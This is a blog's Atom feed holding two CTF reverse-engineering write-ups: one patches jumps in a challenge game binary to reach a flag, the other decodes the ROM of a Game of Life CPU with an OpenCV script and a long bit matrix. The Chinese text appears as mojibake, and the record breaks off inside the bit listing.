<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>èƒ½æ‰“ä¸€è¾ˆå­CTFå—ï¼Ÿ</title>
  <icon>https://www.gravatar.com/avatar/260de78781b3355b5fcbb52d09a7a2a9</icon>
  <subtitle>å‘œå‘œä»€ä¹ˆæ—¶å€™èƒ½æˆä¸ºå‰å®³çš„ä¼šäºŒè¿›åˆ¶çš„å¤§äººå•Š</subtitle>
  <link href="https://github.com/xyy9233/xyy9233.github.io.git/atom.xml" rel="self"/>
  
  <link href="https://github.com/xyy9233/xyy9233.github.io.git/"/>
  <updated>2024-09-16T08:25:40.587Z</updated>
  <id>https://github.com/xyy9233/xyy9233.github.io.git/</id>
  
  <author>
    <name>wind_9233</name>
    <email>1768765226@qq.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>DEFCON quals | Rev  ncHEVjuw.txt</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/09/15/NKgame/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/09/15/NKgame/</id>
    <published>2024-09-14T16:00:00.000Z</published>
    <updated>2024-09-16T08:25:40.587Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NKgame-reverse"><a href="#NKgame-reverse" class="headerlink" title="NKgame reverse"></a>NKgame reverse</h1><h2 id="å®éªŒæ­¥éª¤"><a href="#å®éªŒæ­¥éª¤" class="headerlink" title="å®éªŒæ­¥éª¤"></a>å®éªŒæ­¥éª¤</h2><ol><li>   é€†å‘åˆ†ægame.exeäºŒè¿›åˆ¶ä»£ç çš„ä¸»è¦é€»è¾‘ç»“æ„å’Œé‡è¦æ•°æ®ã€‚</li></ol><p>1ï¼‰æŸ¥æ‰¾ä¸»è¦å‡½æ•°å’Œæµç¨‹ï¼šä½¿ç”¨åæ±‡ç¼–å·¥å…·æ‰“å¼€game.exeï¼ŒæŸ¥æ‰¾ç¨‹åºçš„å…¥å£ç‚¹ï¼Œç„¶ååˆ†æä¸»è¦å‡½æ•°å’Œæµç¨‹ã€‚</p><p>å…ˆæ‰”DIEâ€”â€”</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/wps1.jpg" alt="img"> </p><p>æ‰”IDA x32é‡Œâ€”â€”</p><p>åˆ†ægame.exeç¨‹åºæµç¨‹â€”â€”</p><p>æ•´ä¸ªç¨‹åºå…±åˆ†ä¸ºäº†4ä¸ªå…³å¡ï¼Œå››ä¸ªå…³å¡å¯¹åº”å››ä¸ªåœ°å›¾ï¼Œç©å®¶éœ€è¦æ“æ§ä¸»è§’é€šè¿‡è¿™å››ä¸ªå…³å¡ï¼Œç„¶åä¼šå›åˆ°æœ€å¼€å§‹çš„å…³å¡ï¼Œåœ¨è¿™ä¸ªå…³å¡çš„åœ°å›¾çš„ä¸‹æ–¹çš„æµ·è¾¹æ‰¾åˆ°æœ€åçš„NPCå¹¶ä¸ä¹‹å¯¹è¯å°±å¯ä»¥å¾—åˆ°æœ€åçš„flagã€‚</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/wps2.jpg" alt="img"> </p><p>2ï¼‰ç†è§£å…³å¡åˆ‡æ¢æ¡ä»¶ï¼šæ‰¾åˆ°å…³å¡åˆ‡æ¢çš„æ¡ä»¶åˆ¤æ–­è¯­å¥ã€‚</p><p>å¯¹äºè¿™å››ä¸ªå…³å¡ï¼Œæ¯ä¸ªå…³å¡çš„é€šå…³æ¡ä»¶æ˜¯è¦å‡»æ€è¶³å¤Ÿå¤šçš„æ€ªç‰©ï¼Œåªæœ‰å‡»æ€çš„æ€ªç‰©æ•°é‡è¶³å¤Ÿåï¼Œæ‰èƒ½è¿›å…¥ä¸‹ä¸€ä¸ªå…³å¡ã€‚</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/wps3.jpg" alt="img"> </p><p>3ï¼‰è¯†åˆ«ä¸»è§’å’Œæ€ªç‰©çš„å…³é”®æ•°æ®ï¼šæŸ¥æ‰¾å’Œç†è§£ä¸»è§’å’Œæ€ªç‰©çš„è¡€é‡ã€ç§»é€Ÿã€æ”»å‡»èŒƒå›´ã€æ”»å‡»åŠ›ç­‰å…³é”®æ•°æ®çš„ä½¿ç”¨æ–¹å¼ã€‚</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/wps4.jpg" alt="img"> </p><ol start="2"><li>   ä¿®æ”¹game.exeäºŒè¿›åˆ¶ä»£ç ï¼Œ åœ¨å®éªŒæŠ¥å‘Šä¸­è¯´æ˜ä»£ç ä¿®æ”¹çš„å…·ä½“è¿‡ç¨‹ã€‚</li></ol><p>1ï¼‰æ‰“å¼€æ¸¸æˆè¿›è¡Œä½“éªŒã€‚ä½“éªŒåå‘ç°ï¼Œè§’è‰²æ­»äº¡åï¼Œå±å¹•ä¸Šæ˜¾ç¤ºâ€œdiedâ€,å› æ­¤åœ¨å­—ç¬¦ä¸²ä¸­æœç´¢ï¼Œæ¥æ‰¾åˆ°æ¸¸æˆäººç‰©æ­»äº¡åˆ¤å®šçš„ä»£ç </p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/wps5.jpg" alt="img"><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/wps6.jpg" alt="img"> </p><p>è·³è½¬åˆ°ç¨‹åºä»£ç ä¸­ï¼Œå°†jbæ”¹æˆjmpï¼Œå°±å®ç°äº†ä¸æ­»</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/wps7.jpg" alt="img"> </p><p>2ï¼‰ç»§ç»­é—¯å…³ï¼Œè¿›å…¥ä¸‹ä¸€å…³æ—¶å´ç»™å‡ºå¦‚ä¸‹æç¤ºï¼šYou need to kill enough monsters!</p><p>å†æ¬¡åˆ©ç”¨ida proæœç´¢å­—ç¬¦ä¸²You need to kill enough monsters!</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/wps8.jpg" alt="img"> </p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/wps9.jpg" alt="img"> </p><p>è·³è½¬åˆ°ç¨‹åºä»£ç ä¸­ï¼Œå°†jzæ”¹æˆjmpï¼Œå°±å¯ä»¥ç›´æ¥å¼€å§‹ä¸‹ä¸€å…³ã€‚</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/wps10.jpg" alt="img"> </p><p>3ï¼‰ç»§ç»­æ¸¸æˆâ€”â€”</p><h2 id="äºŒã€å®éªŒç»“æœ"><a href="#äºŒã€å®éªŒç»“æœ" class="headerlink" title="äºŒã€å®éªŒç»“æœ"></a>äºŒã€å®éªŒç»“æœ</h2><p>è¿è¡Œæ¸¸æˆï¼Œæœªå†å‡ºç°ç›¸å…³å¤±è´¥æç¤ºï¼Œæœ€åé€šå…³å¹¶å¾—åˆ°flag:</p><p>(ç¬¬ä¸€æ¬¡ä¸å°å¿ƒè·³è¿‡flagäº†ï¼Œåœ¨flagè¿™é‡Œä¸‹ä¸ªæ–­ç‚¹ï¼‰</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/wps11.jpg" alt="img"> </p><p>flag{a2fdkd80xo}</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/wps12.jpg" alt="img"> </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;NKgame-reverse&quot;&gt;&lt;a href=&quot;#NKgame-reverse&quot; class=&quot;headerlink&quot; title=&quot;NKgame reverse&quot;&gt;&lt;/a&gt;NKgame reverse&lt;/h1&gt;&lt;h2 id=&quot;å®éªŒæ­¥éª¤&quot;&gt;&lt;a href=&quot;#å®</summary>
      
    
    
    
    
    <category term="RE GAME CTF" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/RE-GAME-CTF/"/>
    
  </entry>
  
  <entry>
    <title>DEFCON quals | Rev  ncHEVjuw.txt</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/09/15/DEFCONquals_Rev_ncHEVjuw/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/09/15/DEFCONquals_Rev_ncHEVjuw/</id>
    <published>2024-09-14T16:00:00.000Z</published>
    <updated>2024-09-16T08:18:20.727Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DEFCON-quals-Rev-ncHEVjuw-txt"><a href="#DEFCON-quals-Rev-ncHEVjuw-txt" class="headerlink" title="DEFCON quals | Rev  ncHEVjuw.txt"></a>DEFCON quals | Rev  ncHEVjuw.txt</h1><p>â€œç”µè·¯æ˜¯æ€ä¹ˆæ„æˆCPUçš„ï¼Ÿä½ å¯ä»¥è¿™ä¹ˆæƒ³è±¡ï¼Œç°åœ¨å‡æƒ³ä½ å·²ç»æ§åˆ¶äº†ç”µè·¯ï¼Œå¯ä»¥ä»»æ„çš„æè¿°ç”µè·¯å°±å¯ä»¥æŠŠç”µè·¯åšå‡ºæ¥ï¼Œç„¶åä»è¿™ä¸€æ­¥å¼€å§‹ï¼Œä½ æƒ³è¦åšä¸€ä¸ªCPUå‡ºæ¥ï¼Œå¿½ç•¥ä¸€äº›å…·ä½“çš„ç»†èŠ‚ï¼Œåªå…³æ³¨æœ€å…³é”®çš„éƒ¨åˆ†ï¼Œè¿™                                                      ä¸ªè¿‡ç¨‹èƒ½ä¸èƒ½æè¿°å‡ºæ¥â€”â€”è¿™æ ·å§ï¼Œä¸å¦‚æˆ‘ç›´æ¥ç»™ä½ ä¸ªé¢˜ï¼Œä½ å¯ä»¥åˆ¤æ–­ä¸‹è¿™å—å¤Ÿä¸å¤Ÿäº†ã€‚â€</p><p>ä¸ä½¬è¯´ç”¨Gollyæ‰“å¼€ï¼ŒGollyå­˜å‚¨æ ¼å¼ä¸º.rleï¼Œä¿®æ”¹æ–‡ä»¶åç¼€ï¼Œæ‰“å¼€æ˜¯ä¸€ä¸ªCPUï¼ˆå°é³„é±¼ï¼‰</p><p>æ„Ÿè§‰æ€è·¯å¤§æ¦‚æ˜¯é€šè¿‡CPUçš„è¿è¡Œï¼Œé€šè¿‡ç¨‹åºçš„åº•å±‚è¿è¡Œï¼Œè¿˜åŸç¨‹åºï¼Œå¾—åˆ°flagâ€”â€”</p><p>ä¸»è¦è¿˜æ˜¯è€ƒCPUç»„æˆ</p><hr><p>å°è¯•è¿è¡Œï¼Œä¸€é—ªä¸€é—ªçš„â€”â€”</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-09-13%20220336.png" alt="å±å¹•æˆªå›¾ 2024-09-13 220336"></p><p>æ‹‰è¿‘å†çœ‹ï¼ŒROMï¼ŒROM EXPANDS THIS WAY&lt;â€”</p><p>ROMï¼ˆRead Only Memoryï¼‰åªè¯»å­˜å‚¨å™¨</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-09-13%20220503.png" alt="img"></p><p>ONâ€”â€”å¼€å…³</p><p>ARG i MODE  æ“ä½œæ•°çš„å¯»å€æ–¹å¼</p><p>ARG i VAL å®é™…æ“ä½œæ•°çš„å€¼</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-09-13%20221052.png" alt="img"></p><p>OpCode</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-09-13%20222507.png" alt="img"></p><p>ALU çš„è¾“å…¥åŒ…æ‹¬æ•°æ®å’ŒæŒ‡ä»¤ç ã€‚ALU çš„è¾“å‡ºæ˜¯å…¶æ‰§è¡Œè¿ç®—çš„ç»“æœã€‚</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-09-13%20223002.png" alt="img"></p><p>PCå¯„å­˜å™¨ï¼Œå­˜å‚¨å½“å‰æŒ‡ä»¤çš„åœ°å€ã€‚å½“CPUæ‰§è¡Œä¸€æ¡æŒ‡ä»¤åï¼Œå®ƒä¼šè‡ªåŠ¨å¢åŠ PCçš„å€¼ï¼Œä»¥æŒ‡å‘ä¸‹ä¸€æ¡è¦æ‰§è¡Œçš„æŒ‡ä»¤çš„åœ°å€ã€‚è¿™ä¸ªå¢åŠ æ“ä½œè¢«ç§°ä¸º <strong>INCï¼ˆincrementï¼Œé€’å¢ï¼‰</strong>ã€‚EIP</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-09-13%20223058.png" alt="img"></p><p>RAMï¼ˆéšæœºå­˜å–å­˜å‚¨å™¨ï¼‰æ˜¯ç”¨äºå­˜å‚¨æ•°æ®å’ŒæŒ‡ä»¤çš„å­˜å‚¨å™¨å•å…ƒã€‚</p><p>RAM 16 ADDRï¼šè¡¨ç¤ºRAMçš„åœ°å€å®½åº¦ä¸º16ä½ï¼Œæœ€å¤šå¯ä»¥å¯»å€65536ä¸ªå­˜å‚¨å•å…ƒã€‚</p><p>READ QUEUEè¯»å–é˜Ÿåˆ—â€”â€”æŒ‡ä»¤é¢„å–å’Œ æ•°æ®é¢„å–</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-09-13%20223407.png" alt="img"></p><p>æ‰¾åˆ°ä¸€ä¸ªç±»ä¼¼çš„CPUâ€”â€”ä¸€æ¨¡ä¸€æ ·ã€</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20240916153134760.png" alt="image-20240916153134760"></p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/image-20240916153207060.png" alt="image-20240916153207060"></p><p>æ•´ä¸ªæŒ‡ä»¤é›†åŒ…æ‹¬11æ¡RISCæŒ‡ä»¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">MNZ [test] [value] [dest] â€“ Move if not zero; sets [dest] to [value] if [test] is not zero.</span><br><span class="line">MLZ [test] [value] [dest] â€“ Move if less than zero; sets [dest] to [value] if [test] is less than zero.</span><br><span class="line">ADD [val1] [val2] [dest] â€“ Add; adds [val1] to [val2] and stores the result in [dest].</span><br><span class="line">SUB [val1] [val2] [dest] â€“ Subtract; subtracts [val2] from [val1] and stores the result in [dest].</span><br><span class="line">AND [val1] [val2] [dest] â€“ Bitwise AND; bitwise ANDs together [val1] and [val2] and stores the result in [dest].</span><br><span class="line">OR [val1] [val2] [dest] â€“ Bitwise OR; bitwise ORs together [val1] and [val2] and stores the result in [dest].</span><br><span class="line">XOR [val1] [val2] [dest] â€“ Bitwise XOR; bitwise XORs together [val1] and [val2] and stores the result in [dest].</span><br><span class="line">ANT [val1] [val2] [dest] â€“ Bitwise AND-NOT; bitwise ANDs together [val1] and (NOT [val2]) and stores the result in [dest].</span><br><span class="line">SL [val1] [val2] [dest] â€“ Shift left; shifts [val1] left by [val2] bits and stores the result in [dest].</span><br><span class="line">SRL [val1] [val2] [dest] â€“ Shift right (logical); shifts [val1] right by [val2] bits and stores the result in [dest]. Doesn&#x27;t preserve sign.</span><br><span class="line">SRA [val1] [val2] [dest] â€“ Shift right (arithmetic); shifts [val1] right by [val2] bits and stores the result in [dest], while preserving sign.</span><br></pre></td></tr></table></figure><p>æŒ‡ä»¤æ”¯æŒ4ç§å¯»å€æ–¹å¼ï¼Œåœ¨æ±‡ç¼–è¯­è¨€ä¸­ç”¨ç‰¹å®šå‰ç¼€åŒºåˆ†ï¼š</p><ul><li>ç«‹å³å¯»å€ï¼šæ— å‰ç¼€</li><li>ç›´æ¥å¯»å€ï¼šå‰ç¼€A</li><li>é—´æ¥å¯»å€ï¼šå‰ç¼€B</li><li>åŒé‡é—´æ¥å¯»å€ï¼šå‰ç¼€C</li></ul><hr><p>okæ‡‚äº†ï¼Œé‚£å°±å…ˆæŠŠROMçš„ä¿¡æ¯æ‹¿å‡ºæ¥â€”â€”</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/1111.png" alt="1111"></p><p>è¿™æ˜¯ä¸€ä¸ª1</p><p>å¯¹åº”è¿™ä¸ªå¤§å›¾â€”â€”</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/png1.png" alt="png1"></p><p>æ ‡æ³¨0å’Œ1â€”â€”</p><p><img src="https://xyy9233.oss-cn-beijing.aliyuncs.com/hexoblog/annotated_png1.png" alt="annotated_png1"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">image = cv2.imread(<span class="string">&#x27;png1.png&#x27;</span>)</span><br><span class="line">black_template = cv2.imread(<span class="string">&#x27;0000.png&#x27;</span>, <span class="number">0</span>) </span><br><span class="line">white_template = cv2.imread(<span class="string">&#x27;1111.png&#x27;</span>, <span class="number">0</span>) </span><br><span class="line"></span><br><span class="line">h_template, w_template = black_template.shape</span><br><span class="line">image_gray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)</span><br><span class="line">img_height, img_width = image_gray.shape</span><br><span class="line"></span><br><span class="line">matrix = np.full((img_height // h_template, img_width // w_template), <span class="string">&#x27;0&#x27;</span>, dtype=<span class="built_in">str</span>)</span><br><span class="line">res_black = cv2.matchTemplate(image_gray, black_template, cv2.TM_CCOEFF_NORMED)</span><br><span class="line">threshold = <span class="number">0.8</span></span><br><span class="line">loc_black = np.where(res_black &gt;= threshold)</span><br><span class="line"></span><br><span class="line">res_white = cv2.matchTemplate(image_gray, white_template, cv2.TM_CCOEFF_NORMED)</span><br><span class="line">loc_white = np.where(res_white &gt;= threshold)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> pt <span class="keyword">in</span> <span class="built_in">zip</span>(*loc_black[::-<span class="number">1</span>]):</span><br><span class="line">    x, y = pt</span><br><span class="line">    matrix[y // h_template, x // w_template] = <span class="string">&#x27;0&#x27;</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> pt <span class="keyword">in</span> <span class="built_in">zip</span>(*loc_white[::-<span class="number">1</span>]):</span><br><span class="line">    x, y = pt</span><br><span class="line">    matrix[y // h_template, x // w_template] = <span class="string">&#x27;1&#x27;</span>  </span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;matrix_output.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> matrix:</span><br><span class="line">        f.write(<span class="string">&#x27;&#x27;</span>.join(row) + <span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>æ ¹æ®å»¶ç”³æ–¹å‘å’ŒROMç»“æ„ï¼Œåå››ä½æ˜¯opcodeï¼Œå‰18ä½ä¸ºaddr3ï¼Œ19-18*2ä¸ºaddr2ï¼Œ18*2+1åˆ°18*3ä¸ºaddr1ï¼Œ18*3+4 &#x3D; 57è¡Œï¼Œ</p><p>æ‰€ä»¥ä»å³å¾€å·¦ä¸€åˆ—ä¸€åˆ—ã€ä»ä¸‹å¾€ä¸Šã€4.18.18.18è¯»å–</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line">000000000000000000000000000000000000000000000000000000000</span><br><span class="line">000000000001010110000000000001011000011111111111111110001</span><br><span class="line">000000000000000100000000000000000000000000000000000000110</span><br><span class="line">000000000000000100001100101011100110011111111111111110001</span><br><span class="line">000000000000000110000111000110110100011111111111111110001</span><br><span class="line">000000000000001000001010111101011010011111111111111110001</span><br><span class="line">000000000000001010001100011010000110011111111111111110001</span><br><span class="line">000000000000001100000001110100111110011111111111111110001</span><br><span class="line">000000000000001110000110100010011110011111111111111110001</span><br><span class="line">000000000000010000000101111000110110011111111111111110001</span><br><span class="line">000000000000010010000001001111110100011111111111111110001</span><br><span class="line">000000000000010100000111101110011110011111111111111110001</span><br><span class="line">000000000000010110000010111001000010011111111111111110001</span><br><span class="line">000000000000011000001000110010110010011111111111111110001</span><br><span class="line">000000000000011010000111001111001110011111111111111110001</span><br><span class="line">000000000000011100000010010100101010011111111111111110001</span><br><span class="line">000000000000011110000011110010010100011111111111111110001</span><br><span class="line">000000000000100000001010111110100000011111111111111110001</span><br><span class="line">000000000000100010000100000101100110011111111111111110001</span><br><span class="line">000000000000100100000110000100000100011111111111111110001</span><br><span class="line">000000000000100110001011000110100100011111111111111110001</span><br><span class="line">000000000000101000001000000011100110011111111111111110001</span><br><span class="line">000000000000101010000011011110111000011111111111111110001</span><br><span class="line">000000000000101100001011001000010010011111111111111110001</span><br><span class="line">000000000000101110001010111001000110011111111111111110001</span><br><span class="line">000000000000110000000110000110001010011111111111111110001</span><br><span class="line">000000000000110010000011111000000000011111111111111110001</span><br><span class="line">000000000000110100001101000000001100011111111111111110001</span><br><span class="line">000000000000110110000111100011110110011111111111111110001</span><br><span class="line">000000000000111000000011001010001110011111111111111110001</span><br><span class="line">000000000000111010000000111000011100011111111111111110001</span><br><span class="line">000000000000111100001011000101100010011111111111111110001</span><br><span class="line">000000000000111110001100001101110110011111111111111110001</span><br><span class="line">000000000001000000001000000001110100011111111111111110001</span><br><span class="line">000000000001000010000010100000110010011111111111111110001</span><br><span class="line">000000000001000100000111100111010010011111111111111110001</span><br><span class="line">000000000001000110001011101001110110011111111111111110001</span><br><span class="line">000000000001001000001011100101110100011111111111111110001</span><br><span class="line">000000000001001010000110111000001100011111111111111110001</span><br><span class="line">000000000001001100001011010010100110011111111111111110001</span><br><span class="line">000000000001001110000000000000000000011111111111111110001</span><br><span class="line">000000000001001110010010101110101010100000000000000010110</span><br><span class="line">000000000000000100100000000000000100100000000001001110011</span><br><span class="line">000000000001001110011001001001111100100000000000000010110</span><br><span class="line">000000000000000110100000000000000110100000000001001110011</span><br><span class="line">000000000001001110010100111111010110100000000000000010110</span><br><span class="line">000000000000001000100000000000001000100000000001001110011</span><br><span class="line">000000000001001110010010011101010010100000000000000010110</span><br><span class="line">000000000000001010100000000000001010100000000001001110011</span><br><span class="line">000000000001001110011111111000111110100000000000000010110</span><br><span class="line">000000000000001100100000000000001100100000000001001110011</span><br><span class="line">000000000001001110011000100101010100100000000000000010110</span><br><span class="line">000000000000001110100000000000001110100000000001001110011</span><br><span class="line">000000000001001110011011111011011010100000000000000010110</span><br><span class="line">000000000000010000100000000000010000100000000001001110011</span><br><span class="line">000000000001001110011111010011110010100000000000000010110</span><br><span class="line">000000000000010010100000000000010010100000000001001110011</span><br><span class="line">000000000001001110011001110001000000100000000000000010110</span><br><span class="line">000000000000010100100000000000010100100000000001001110011</span><br><span class="line">000000000001001110011100111100111010100000000000000010110</span><br><span class="line">000000000000010110100000000000010110100000000001001110011</span><br><span class="line">000000000001001110010110110110110110100000000000000010110</span><br><span class="line">000000000000011000100000000000011000100000000001001110011</span><br><span class="line">000000000001001110011001010010100010100000000000000010110</span><br><span class="line">000000000000011010100000000000011010100000000001001110011</span><br><span class="line">000000000001001110011100011000101100100000000000000010110</span><br><span class="line">000000000000011100100000000000011100100000000001001110011</span><br><span class="line">000000000001001110011101110101001000100000000000000010110</span><br><span class="line">000000000000011110100000000000011110100000000001001110011</span><br><span class="line">000000000001001110010101000001000010100000000000000010110</span><br><span class="line">000000000000100000100000000000100000100000000001001110011</span><br><span class="line">000000000001001110011010001000011110100000000000000010110</span><br><span class="line">000000000000100010100000000000100010100000000001001110011</span><br><span class="line">000000000001001110011000000111101100100000000000000010110</span><br><span class="line">000000000000100100100000000000100100100000000001001110011</span><br><span class="line">000000000001001110010101001001001100100000000000000010110</span><br><span class="line">000000000000100110100000000000100110100000000001001110011</span><br><span class="line">000000000001001110010110000110001010100000000000000010110</span><br><span class="line">000000000000101000100000000000101000100000000001001110011</span><br><span class="line">000000000001001110011101100010000100100000000000000010110</span><br><span class="line">000000000000101010100000000000101010100000000001001110011</span><br><span class="line">000000000001001110010101001011011110100000000000000010110</span><br><span class="line">000000000000101100100000000000101100100000000001001110011</span><br><span class="line">000000000001001110010100111100011110100000000000000010110</span><br><span class="line">000000000000101110100000000000101110100000000001001110011</span><br><span class="line">000000000001001110011000001001000000100000000000000010110</span><br><span class="line">000000000000110000100000000000110000100000000001001110011</span><br><span class="line">000000000001001110011101111011100100100000000000000010110</span><br><span class="line">000000000000110010100000000000110010100000000001001110011</span><br><span class="line">000000000001001110010011000011100100100000000000000010110</span><br><span class="line">000000000000110100100000000000110100100000000001001110011</span><br><span class="line">000000000001001110011001100111111010100000000000000010110</span><br><span class="line">000000000000110110100000000000110110100000000001001110011</span><br><span class="line">000000000001001110011101001101000100100000000000000010110</span><br><span class="line">000000000000111000100000000000111000100000000001001110011</span><br><span class="line">000000000001001110011110111011110100100000000000000010110</span><br><span class="line">000000000000111010100000000000111010100000000001001110011</span><br><span class="line">000000000001001110010101001001111010100000000000000010110</span><br><span class="line">000000000000111100100000000000111100100000000001001110011</span><br><span class="line">000000000001001110010010010001111010100000000000000010110</span><br><span class="line">000000000000111110100000000000111110100000000001001110011</span><br><span class="line">000000000001001110010110000101110000100000000000000010110</span><br><span class="line">000000000001000000100000000001000000100000000001001110011</span><br><span class="line">000000000001001110011100100100111000100000000000000010110</span><br><span class="line">000000000001000010100000000001000010100000000001001110011</span><br><span class="line">000000000001001110011001101010111110100000000000000010110</span><br><span class="line">000000000001000100100000000001000100100000000001001110011</span><br><span class="line">000000000001001110010101101101111010100000000000000010110</span><br><span class="line">000000000001000110100000000001000110100000000001001110011</span><br><span class="line">000000000001001110010101101001001100100000000000000010110</span><br><span class="line">000000000001001000100000000001001000100000000001001110011</span><br><span class="line">000000000001001110011000111011000110100000000000000010110</span><br><span 